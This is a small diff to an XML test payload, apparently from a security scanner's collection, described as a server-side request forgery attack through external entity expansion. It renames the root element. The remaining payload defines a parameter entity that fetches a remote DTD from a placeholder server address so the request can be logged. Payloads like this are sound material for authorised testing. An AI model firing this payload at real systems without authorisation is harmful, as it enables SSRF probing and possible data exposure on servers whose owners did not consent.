@@ -8,9 +8,9 @@ description: Server Side Request Forgery Attack via External Entity Expansion (X
 content: xxe-pe.dtd
 log-request: yes
 -->
-<!DOCTYPE data [
-  <!ELEMENT data (#PCDATA)>
+<!DOCTYPE root [
+  <!ELEMENT root (#PCDATA)>
   <!ENTITY % remote SYSTEM "http://{server_address}/xxe-pe.dtd">
   %remote;
 ]>
-<data>This is a test.</data>
+<root>This is a test.</root>
